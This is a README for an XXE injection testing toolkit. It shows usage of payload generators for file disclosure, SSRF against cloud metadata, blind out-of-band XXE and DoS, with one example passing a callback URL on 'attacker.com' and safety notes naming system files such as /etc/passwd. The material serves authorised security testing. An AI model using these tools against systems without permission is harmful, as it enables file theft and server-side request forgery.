# XXE Testing Reference

Reference implementations for XML External Entity (XXE) injection testing.

## Contents

- `xxe_payloads.py` - XXE payload generators organized by attack type
- `validate_xxe.py` - XXE validation workflow script

## Usage

### Payload Generation

```python
from xxe_payloads import (
    file_disclosure_payloads,
    ssrf_payloads,
    blind_xxe_payloads,
    xinclude_payloads,
    dos_payloads,
    svg_xxe_payload
)

# Get file disclosure payloads for Linux
for payload in file_disclosure_payloads(os_type="linux"):
    print(payload)

# Get SSRF payloads for cloud metadata
for payload in ssrf_payloads(target_type="aws"):
    print(payload)

# Get blind XXE payloads with callback URL
for payload in blind_xxe_payloads(callback_url="http://attacker.com"):
    print(payload)
```

### Validation

```python
from validate_xxe import XXEValidator

validator = XXEValidator(base_url="http://target.com")
results = validator.validate_endpoint(
    endpoint="/api/parse",
    method="POST",
    content_type="application/xml"
)

for result in results:
    print(f"{result['status']}: {result['evidence']}")
```

## Attack Types

| Attack Type | Payload Module | Detection Method |
|-------------|----------------|------------------|
| File Disclosure | `file_disclosure_payloads()` | Check for file contents in response |
| SSRF | `ssrf_payloads()` | Check for internal service response or callback |
| Blind XXE (OOB) | `blind_xxe_payloads()` | Monitor callback server for requests |
| XInclude | `xinclude_payloads()` | Check for file contents (when DOCTYPE blocked) |
| DoS | `dos_payloads()` | Monitor response time increase |
| SVG Upload | `svg_xxe_payload()` | Check rendered image or processing output |

## CWE Coverage

These reference implementations help detect:
- **CWE-611:** Improper Restriction of XML External Entity Reference
- **CWE-776:** Improper Restriction of Recursive Entity References in DTDs
- **CWE-827:** Improper Control of Document Type Definition
- **CWE-918:** Server-Side Request Forgery (via XXE)

## Safety Notes

- Target benign files only (`/etc/passwd`, `win.ini`, `/etc/hostname`)
- NEVER target sensitive files (`/etc/shadow`, private keys, database configs)
- Use minimal DoS payloads; abort immediately if server slows
- OOB callbacks only to domains you control
- Clean up external DTD files after testing
